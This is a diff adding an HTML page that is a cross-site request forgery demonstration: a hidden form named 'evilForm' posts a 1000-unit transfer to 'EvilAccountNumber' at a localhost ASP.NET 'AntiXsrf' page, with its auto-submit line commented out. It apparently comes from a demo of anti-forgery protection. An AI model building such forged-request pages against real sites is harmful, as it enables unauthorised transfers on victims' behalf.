@@ -1,0 +1,31 @@
+﻿<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+    <title></title>
+</head>
+<body>
+    <form id="evilForm" method="post" action="http://localhost:35140/AntiXsrf/Default.aspx">
+        <input type="hidden" name="__EVENTTARGET" value="" />
+        <input type="hidden" name="__EVENTARGUMENT" value="" />
+        <input type="hidden" name="__VIEWSTATE" value="m0DjJ/HX/eGEEzfgKfD6OV4ifq+L0kmg8La1FLcYbJWCw0tnBhW0UDUoxlxSyBAvw40L0pPbV8qsr8C3kb+4ZqiV6yrNUkJmlfdiw2MpdMM=" />
+        <input type="hidden" name="__EVENTVALIDATION" value="xWwOvWwUKpE2ZNdPUQ1HX9lUQpesrUNk0/fLwdbq1tZwlK9EzcgGQhKLvfCZ1eKygHCJwfrl5TPUkvF0bor0AOsT6EKufm1EOXeFur4OvQtXNmazaqskjmK3psmRxk+sySnp32CoLPt6LZdujVFG2gJLR0wJEhv3LGBkGb0c2X9VQLTA9g62BOeCRBhJE1Bewj9SoydMFEGfoaTRcZd+9Mnk9rzAK2+mo1YCgbaJ4yVAJb8ueJ5b2ruVxobMMh113klz+0dpXMtKZs/KfUgiXQ==" />
+
+        <input type="text" id="amount" name="ctl00$MainContent$amount" value="1000" />
+        <input type="text" name="ctl00$MainContent$fromAccount" value="12345" />
+        <input type="text" name="ctl00$MainContent$toAccountRoutingNumber" value="000000" />
+        <input type="text" name="ctl00$MainContent$toAccountNumber" value="EvilAccountNumber" />
+
+        <input id="submitIt" type="submit" name="ctl00$MainContent$ctl04" value="Transfer" />
+    </form>
+
+    <script src="Scripts/jquery-1.10.2.min.js"></script>
+    <script>
+        $(function () {
+            $("#amount").val("1000");
+
+            //$("#submitIt").click();
+        });
+    </script>
+
+</body>
+</html>
